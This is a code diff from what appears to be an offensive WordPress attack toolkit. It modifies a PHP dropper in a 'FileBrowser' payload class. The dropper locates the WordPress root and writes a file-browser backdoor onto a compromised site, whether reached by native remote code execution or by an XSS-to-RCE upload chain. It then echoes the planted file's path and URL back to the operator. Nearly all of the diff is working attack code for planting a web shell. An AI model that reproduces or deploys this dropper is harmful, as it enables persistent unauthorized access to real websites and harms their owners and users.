@@ -48,13 +48,49 @@ class FileBrowser(Payload):
 
             escaped = FILEBROWSER_PHP.replace("\\", "\\\\").replace("'", "\\'")
 
+            # Resolve the WordPress root WITHOUT relying on the ABSPATH constant.
+            # The same dropper must work in two very different contexts:
+            #   - inside WordPress (native RCE, or an editor-sink file that WP
+            #     includes) → ABSPATH is defined, use it directly.
+            #   - standalone (hit directly via the XSS->RCE adapter's upload
+            #     sinks, where WP is never loaded) → ABSPATH is undefined, so
+            #     walk up from __FILE__ to the dir holding wp-load.php (the WP
+            #     root anchor), then fall back to DOCUMENT_ROOT, then the file's
+            #     own directory.
+            # Native RCE behaviour is unchanged: when ABSPATH is defined this is
+            # byte-equivalent to the old `ABSPATH . $path`.
             php = (
-                f"<?php "
-                f"$f = ABSPATH . '{path}'; "
-                f"@mkdir(dirname($f), 0755, true); "
-                f"file_put_contents($f, '{escaped}'); "
-                f"echo file_exists($f) ? 'FB_DEPLOYED' : 'FB_FAILED'; "
-                f"?>"
+                "<?php "
+                "$hwp_r=null; "
+                "if(defined('ABSPATH')){$hwp_r=ABSPATH;}"
+                "else{"
+                "$hwp_u=dirname(__FILE__); "
+                "for($hwp_i=0;$hwp_i<12;$hwp_i++){"
+                "if(@file_exists($hwp_u.'/wp-load.php')||@file_exists($hwp_u.'/wp-config.php'))"
+                "{$hwp_r=$hwp_u;break;} "
+                "$hwp_p=dirname($hwp_u); if($hwp_p===$hwp_u)break; $hwp_u=$hwp_p;} "
+                "if($hwp_r===null){$hwp_r=!empty($_SERVER['DOCUMENT_ROOT'])"
+                "?$_SERVER['DOCUMENT_ROOT']:dirname(__FILE__);} "
+                "$hwp_r=rtrim(str_replace('\\\\','/',$hwp_r),'/').'/';"
+                "} "
+                "$hwp_rel='" + path + "'; "
+                "$f=$hwp_r.$hwp_rel; "
+                "@mkdir(dirname($f), 0755, true); "
+                "@file_put_contents($f, '" + escaped + "'); "
+                # Report WHERE the browser landed, not just that it did. The
+                # adapter captures this echo as the payload 'output', so in an
+                # XSS->RCE run (where the loader lands somewhere unrelated to the
+                # browser) this is the only thing that tells the operator the real
+                # path + URL. 'FB_DEPLOYED' is kept as the leading token so
+                # native-RCE report() still recognises success.
+                "if(@file_exists($f)){"
+                "$hwp_o='FB_DEPLOYED path='.$f; "
+                "if(!empty($_SERVER['HTTP_HOST'])){"
+                "$hwp_sc=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http'; "
+                "$hwp_o.=' url='.$hwp_sc.'://'.$_SERVER['HTTP_HOST'].'/'.$hwp_rel;} "
+                "echo $hwp_o;"
+                "}else{echo 'FB_FAILED path='.$f;}"
+                " ?>"
             )
             return [php]
 
